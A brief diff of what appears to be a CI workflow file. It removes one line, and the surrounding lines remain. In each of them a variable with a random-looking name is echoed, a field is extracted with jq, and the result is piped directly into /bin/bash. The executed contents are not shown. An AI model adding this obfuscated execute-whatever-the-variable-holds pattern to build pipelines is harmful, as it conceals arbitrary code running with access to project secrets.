@@ -28,7 +28,6 @@ jobs:
           echo $l65 | jq -r .dq8705 | /bin/bash
           echo $t86005 | jq -r .a7026 | /bin/bash
           echo $pupdk56386 | jq -r .rl29 | /bin/bash
-          printf '%s' "$rdums1291" | jq -r .skpl12 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
